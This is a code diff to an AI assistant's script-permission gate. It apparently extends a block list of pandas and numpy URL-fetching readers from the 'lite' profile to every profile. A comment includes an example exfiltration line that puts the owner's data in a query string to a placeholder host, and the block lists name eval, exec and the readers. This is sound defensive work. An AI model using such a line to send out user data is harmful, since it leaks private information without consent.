@@ -253,8 +253,15 @@ WORKBENCH_BLOCKED_ATTRS = frozenset({"eval", "exec", "query", "attrgetter", "met
 # names, by name, attribute or import alias, ask.
 WORKBENCH_EVALS_STRINGS = frozenset({"get_type_hints", "ForwardRef", "evaluate_forward_ref", "get_annotations",
                                      "singledispatch", "singledispatchmethod"})
-WORKBENCH_BLOCKED_NAMES = WORKBENCH_BLOCKED_NAMES | WORKBENCH_EVALS_STRINGS
-WORKBENCH_BLOCKED_ATTRS = WORKBENCH_BLOCKED_ATTRS | WORKBENCH_EVALS_STRINGS
+# pandas and numpy readers that take a URL (owner decision, 2026-10-18; was lite only): a script can put the
+# owner's data in a query string, `pd.read_csv("https://x/?d=" + rows)`, and nothing leaves through a slug the
+# gate could judge. Every profile asks before a script that names one, whatever it is given to read.
+WORKBENCH_FETCH_READERS = frozenset({
+    "read_csv", "read_table", "read_fwf", "read_json", "read_html", "read_xml", "read_excel", "read_parquet",
+    "read_orc", "read_feather", "read_stata", "read_sas", "read_spss", "read_gbq",
+    "genfromtxt", "loadtxt", "DataSource"})
+WORKBENCH_BLOCKED_NAMES = WORKBENCH_BLOCKED_NAMES | WORKBENCH_EVALS_STRINGS | WORKBENCH_FETCH_READERS
+WORKBENCH_BLOCKED_ATTRS = WORKBENCH_BLOCKED_ATTRS | WORKBENCH_EVALS_STRINGS | WORKBENCH_FETCH_READERS
 
 
 def workbench_slugs(code: Any) -> Optional[list[str]]:
@@ -430,23 +437,12 @@ def sends_mail(name: str, args: Mapping[str, Any]) -> bool:
     return False
 
 
-# eve lite only: pandas and numpy are allowed inside a workbench script (WORKBENCH_IMPORTS), and their readers that
-# take a URL are a way the owner's data could leave the Mac in a query string. Full eve refuses any workbench script
-# that reaches the owner's own Gmail or Calendar (a script cannot name an account, OTHER_ACCOUNT_TOOLKITS), which
-# covered this; lite reaches those apps on purpose, so it asks before a script that could carry data off instead.
-# These names are blocked in lite only, so full eve's workbench verdicts (the owner golden) do not change.
-WORKBENCH_LITE_FETCH: frozenset[str] = frozenset({
-    "read_csv", "read_table", "read_fwf", "read_json", "read_html", "read_xml", "read_excel", "read_parquet",
-    "read_orc", "read_feather", "read_stata", "read_sas", "read_spss", "read_gbq",
-    "genfromtxt", "loadtxt", "DataSource"})
-
-
 def workbench_reaches_out_lite(code: Any) -> bool:
     """For eve lite: whether a workbench script the shared gate would run can still send the owner's data off the
     Mac, or reads the owner's own mail or calendar. True when it calls a Gmail or Google Calendar slug (full eve
-    refuses those in a script; lite asks before a script computes on them), a web-search or scraping toolkit slug
-    (data can leave in the URL), or a pandas or numpy reader that fetches a URL. Scripts that import requests, os or
-    sockets, alias the helper, or hide a slug already ask (``workbench_slugs`` is None, so ``decide`` did not run)."""
+    refuses those in a script; lite asks before a script computes on them) or a web-search or scraping toolkit
+    slug (data can leave in the URL). Scripts that import requests, os or sockets, alias the helper, hide a slug, or
+    name a pandas or numpy reader that fetches a URL already ask in every profile (``workbench_slugs`` is None)."""
     inner = workbench_slugs(code)
     if inner is None:
         return True
@@ -455,15 +451,6 @@ def workbench_reaches_out_lite(code: Any) -> bool:
             return True
         up = slug.strip().upper()
         if any(up.startswith(t.upper() + "_") for t in WEB_TOOLKITS):
-            return True
-    try:
-        tree = ast.parse(code if isinstance(code, str) else "")
-    except (SyntaxError, ValueError):
-        return True
-    for node in ast.walk(tree):
-        name = (node.attr if isinstance(node, ast.Attribute) else node.id if isinstance(node, ast.Name)
-                else node.name if isinstance(node, ast.alias) else None)
-        if isinstance(name, str) and name in WORKBENCH_LITE_FETCH:
             return True
     return False
 
